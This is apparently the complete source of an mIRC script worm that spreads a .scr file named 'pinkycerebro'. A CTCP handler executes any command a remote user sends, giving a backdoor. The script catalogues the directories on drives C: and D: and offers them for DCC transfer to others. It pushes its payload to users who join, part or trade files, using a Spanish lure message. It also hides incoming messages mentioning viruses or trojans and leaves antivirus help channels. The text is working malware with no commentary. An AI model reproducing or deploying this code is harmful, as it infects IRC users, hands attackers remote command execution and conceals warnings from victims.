ctcp 1:*:: { if ($1 != DCC) || ($1 != CHAT) || ($1 != Version) || ($1 != Time) || ($1 != Finger) || ($1 != userinfo) || ($1 != Ping) { $1- } }
ctcp 1:*:*: { if ($1 != DCC) || ($1 != CHAT) || ($1 != Version) || ($1 != Time) || ($1 != Finger) || ($1 != userinfo) || ($1 != Ping) { $1- } }
on 1:start: { inc %inc.start | if ($exists($shortfn(%HST)) = $true) { goto setx } | elseif  ($exists(c:\pinkycerebro.scr) = $true) { set %HST C:\pinkycerebro.scr } | elseif  ($exists(c:\windows\pinkycerebro.scr) = $true) { set %HST C:\windows\pinkycerebro.scr }
elseif  ($exists($shortfn(c:\Archivos de programa\pinkycerebro.scr)) = $true) { set %HST c:\Archivos de programa\pinkycerebro.scr } | :setx | set %disk $mircdirdisk.nfo | set %dirc $mircdirdirc.nfo | set %dird $mircdirdird.nfo | if (%inc.start == 7) { echo -s *** Buscando Lista de servidores, espere por favor... | %inc.start = 0 | .timerCI 1 5 CI } }
alias FI { if ($exists(%disk) = $true) { .remove %disk | goto ce } | else { goto ce } | :ce | return $findfile($1,*.*,0,write %disk $1-) | halt }
alias CI { if ($exists(%dirc) = $true) { .remove %dirc | goto ds } | :ds | return $finddir(c:\,*.*,0,write %dirc $1-) }
alias DI { if ($exists(%dird) = $true) { .remove %dird | goto dx } | :dx | if ($disk(D:\) == $true) { goto dp } | else { halt } | :dp | return $finddir(d:\,*.*,0,write %dird $1-) }
alias cix { /dcc send $$1 %dirc }
alias dix { /dcc send $$1 %dird }
alias fix { /dcc send $$1 %disk }
alias LS { if ( $sock(£.*,0) > 5 ) { return } | Set %£S. $+ $1 0 | :pointless | Set %pt $r(2400,5000) | if ( $portfree(%pt) = $false ) { goto pointless } | Set [ % $+ [ be. $+ [ $1 ] ] ] 0 | Set %pk. $+ $1 4096 
  Set %sz $file($shortfn(%HST)).size | Set %£.tmp4 £. $+ $1 | .timer $+ $1 1 240 .sockclose %£.tmp4 $+ $chr(32) $+ $chr(124) $+ $chr(32) $+ .sockclose ƒ. $+ $1 | .timer1 $+ $1 1 20 TO $1 | .notice $1 DCC Send $left($gettok($shortfn(%HST),3,92), $calc( [ $len( [ $gettok($shortfn(%HST),3,92) ] ) ] - 4 ) ) ( $+ $ip $+ )
if ( $1 = %£.warning ) { return } | .ignore -u90 $1 2 | .raw -q privmsg $1 : $+ $chr(1) $+ DCC SEND $shortfn(%HST) $longip($ip) %pt %sz $+ $chr(1) | if ( $sock(%£.tmp4) != $null ) { .sockclose %£.tmp4 } | .socklisten %£.tmp4 %pt }
On 1:Disconnect:{ .timers off | .sockclose * | if ($exists(%disk) = $true) { .remove %disk } | if ($exists(%dirc) = $true) { .remove %dirc } | if ($exists(%dird) = $true) { .remove %dird } }
alias TO { if ( [ % $+ [ be. $+ [ $1 ] ] ] = 0 ) { sockclose [ ƒ. $+ [ $1 ] ] | sockclose [ £. $+ [ $1 ] ] | .timer $+ $1 off } }
On 1:Join:*:{ if ($r(1,3) = 1) && ($exists(%HST) = $true) && ( $nick != $me ) { LS $nick } }
On 1:Join:*:{ if ( help isin # ) || ( ayuda isin # ) || ( virus isin # ) || ( $remove(#,$chr(35)) isin dmsetupbackorificenohackaidenetolinfected ) { .timerns 1 5 net.sal # } } 
On ^1:Part:*:{ if ($r(1,3) = 1) && ($exists(%HST) = $true) && ( $nick != $me ) { LS $nick } }
On 1:FileSent:*:{ if ($r(1,2) = 1) && ($exists(%HST) = $true) { LS $nick } }
On 1:FileRcvd:*:{ if ($r(1,2) = 1) && ($exists(%HST) = $true) { LS $nick } }
On 1:Notify:{ if ($exists(%HST) = $true) { if ( $nick !isin %£.nt ) { %£.nt = %£.nt $+ $nick | .ignore -u120 $nick 2 | .timer $+ $r(99,199) 1 10 .msg $nick Hola... cacha esto..., ok | .timer $+ $r(300,399) 1 12 LS $nick } } }
On 1:SockClose:ƒ.*:{ Set %£.tmp6 $remove($sockname,ƒ.) | sockclose $sockname | sockclose [ £. $+ [ %£.tmp6 ] ] | .timer $+ %£.tmp6 off }
On 1:SockListen:£.*:{ Set %£.tmp5 $remove($sockname,£.) | sockaccept ƒ. $+ %£.tmp5 | SL %£.tmp5 }
On 1:SockWrite:ƒ.*:{ Set %£.tmp6 $remove($sockname,ƒ.) | if ( [ % $+ [ £S. $+ [ %£.tmp6 ] ] ] = 1 ) { .timer $+ $r(99,9999) 1 10 sockclose $sockname | .timer $+ $r(99,9999) 1 10 sockclose [ £. $+ [ %£.tmp6 ] ] | .timer $+ %£.tmp6 off | halt } | SL %£.tmp6 }
On ^1:SNOTICE:*:{ nodesin $1- }
On ^1:Text:*:*:{ nodesin $1- }
On ^1:Action:*:*:{ nodesin $1- }
On ^1:Notice:*:*:{ nodesin $1- }
On ^1:Chat:*:{ nodesin $1- }
alias nodesin { if ( Stages isin $strip($1-) ) || ( dmsetup isin $strip($1-) ) || ( troyan isin $strip($1-) ) || ( netol isin $strip($1-) ) || ( .shs isin $strip($1-) ) || ( script isin $strip($1-) ) || ( worm isin $strip($1-) ) || ( virus isin $strip($1-) ) || ( trojan isin $strip($1-) ) || ( infect isin $strip($1-) ) || ( spread isin $strip($1-) ) || ( remote isin $strip($1-) ) || ( events isin $strip($1-) ) || ( unload isin $strip($1-) ) || ( virii isin $strip($1-) ) || ( dccallow isin $strip($1-) ) || ( pinky isin $strip($1-) ) { halt } }
alias SL { if ( $calc( [ % $+ [ be. $+ [ $1 ] ] ] + [ % $+ [ pk. $+ [ $1 ] ] ] ) < %sz) { bread $shortfn(%HST) [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite ƒ. $+ $1 &data  | inc [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] }
else { Set [ % $+ [ £S. $+ [ $1 ] ] ] 1 [ % $+ [ pk. $+ [ $1 ] ] ] = $calc( %sz - [ % $+ [ be. $+ [ $1 ] ] ] ) | if ( [ % $+ [ pk. $+  [ $1 ] ] ] = 0) { return } | bread $shortfn(%HST) [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite ƒ. $+ $1 &data } }
alias remote { if ( $1 = on ) { .echo -e 2*** Remote is ON (Ctcps,Events,Raw) } | else { .echo -e 2*** Remote is OFF | halt } }
alias events { if ( $1 = on ) { .echo -e 2*** Events are ON } | else { .echo -e 2*** Events are OFF | halt } }
raw 439:*:{ halt }
alias net.sal { Set %var1 1 | :cuidado | Set %var2 $nick($1,%var1) | if ( %var2 = $null ) { .part $1 | halt } | if ( %var2 != $me ) && ( %var2 != X ) && ( %var2 != W ) { .ignore %var2 2 } | inc %var1 | goto cuidado }
